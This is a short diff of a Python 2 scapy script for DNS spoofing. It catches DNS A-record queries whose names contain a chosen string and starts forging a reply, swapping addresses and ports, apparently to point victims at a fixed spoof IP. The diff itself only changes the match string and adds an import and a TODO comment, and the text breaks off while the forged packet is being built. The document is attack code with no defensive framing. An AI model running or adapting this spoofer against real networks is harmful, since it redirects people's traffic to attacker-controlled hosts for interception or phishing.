@@ -1,9 +1,11 @@
 from scapy.all import *
+import argparse
 
 spoofIp = '172.24.28.45'
 
+#TODO remove blah
 def spoofPacket(pkt):
-	if (pkt.haslayer(DNSQR) and pkt[DNS].qr == 0 and pkt[DNSQR].qtype ==1 and "blah" in pkt[DNSQR].qname):
+	if (pkt.haslayer(DNSQR) and pkt[DNS].qr == 0 and pkt[DNSQR].qtype ==1 and "name" in pkt[DNSQR].qname):
 		print pkt.show()
 		spfPkt = IP(src=pkt[IP].dst, dst=pkt[IP].src)\
 				/UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport)\
